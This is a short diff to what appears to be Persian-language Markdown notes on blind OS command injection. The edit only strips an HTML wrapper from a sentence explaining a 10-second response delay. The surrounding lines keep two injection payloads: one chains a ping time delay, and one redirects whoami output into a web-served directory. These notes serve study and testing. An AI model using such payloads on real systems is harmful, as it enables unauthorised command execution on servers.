@@ -20,7 +20,7 @@
 
 ## Blind OS Command Injection
 - Time delays
-  - <p dir="rtl" align="right">در این حالت پس از اجرای دستور فوق، 10 ثانیه طول می کشد تا response را در مرورگر مشاهده کنیم</p> 
+  - در این حالت پس از اجرای دستور فوق، 10 ثانیه طول می کشد تا response را در مرورگر مشاهده کنیم 
   - ```x||ping+-c+10+127.0.0.1||```
 - Output redirection
   - ```||whoami>/var/www/images/output.txt||```
